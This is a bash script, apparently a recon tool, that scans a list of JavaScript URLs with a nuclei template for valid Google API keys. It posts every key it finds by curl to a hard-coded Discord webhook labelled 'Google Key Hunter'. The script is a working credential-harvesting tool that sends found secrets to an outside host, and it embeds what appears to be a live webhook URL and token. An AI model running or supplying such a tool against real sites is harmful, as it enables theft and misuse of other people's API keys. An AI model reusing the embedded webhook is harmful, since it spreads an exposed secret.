#!/bin/bash

# ================== CONFIGURATION ==================
WEBHOOK_URL="https://discord.com/api/webhooks/1511433361862955211/_LBL1v2SJ3AUrXf8jOqblx8bNrdAfL2YtPWuyoya5PKohu8VmjzKhJtalkR-labnS_ug"   # ←←← CHANGE THIS
# ==================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# Default values
INPUT_FILE="urls.txt"
TEMPLATE="google-api-key-validator.yaml"

# Parse arguments
while getopts "f:t:h" opt; do
  case $opt in
    f) INPUT_FILE="$OPTARG" ;;
    t) TEMPLATE="$OPTARG" ;;
    h)
      echo "Usage: $0 [-f <urls_file>] [-t <template_file>]"
      echo "  -f    Input file containing JS URLs (default: urls.txt)"
      echo "  -t    Nuclei template file (default: google-api-key-validator.yaml)"
      exit 0
      ;;
    *) echo "Invalid option. Use -h for help."; exit 1 ;;
  esac
done

echo -e "${GREEN}[+] Google API Key Scanner (Upload Validator) Started...${NC}"
echo -e "${GREEN}[+] Using input file : $INPUT_FILE${NC}"

# Checks
if [ ! -f "$INPUT_FILE" ]; then
    echo -e "${RED}[-] Input file '$INPUT_FILE' not found!${NC}"
    exit 1
fi

if [ ! -f "$TEMPLATE" ]; then
    echo -e "${RED}[-] Template '$TEMPLATE' not found!${NC}"
    exit 1
fi

if [ -z "$WEBHOOK_URL" ] || [[ "$WEBHOOK_URL" == *"your-webhook-url-here"* ]]; then
    echo -e "${RED}[-] Please update WEBHOOK_URL in the script!${NC}"
    exit 1
fi

# Run Nuclei
echo -e "${GREEN}[+] Running Nuclei scan...${NC}"
nuclei -l "$INPUT_FILE" \
       -t "$TEMPLATE" \
       -o results.txt \
       -silent \
       -ni \
       -c 40 \
       -retries 2

echo -e "\n${GREEN}[+] Scan completed. Checking for valid keys...${NC}"

found=false

while IFS= read -r line; do
    if echo "$line" | grep -q "\[google-api-key-validator:source\]"; then
        found=true
        echo -e "${GREEN}[VALID KEY FOUND]${NC} $line"
        
        CLEAN_LINE=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | sed 's/"/\\"/g')
        
        curl -s -X POST "$WEBHOOK_URL" \
            -H "Content-Type: application/json" \
            -d '{
                "content": "🚨 **Valid Google API Key Found via Upload!**\n```'"$CLEAN_LINE"'```",
                "username": "Google Key Hunter"
            }' > /dev/null && echo -e "${GREEN}[WEBHOOK] Sent successfully${NC}"
        
        sleep 1
    fi
done < results.txt

if [ "$found" = false ]; then
    echo -e "${RED}[-] No valid keys found.${NC}"
fi

echo -e "${GREEN}[+] Task completed.${NC}"
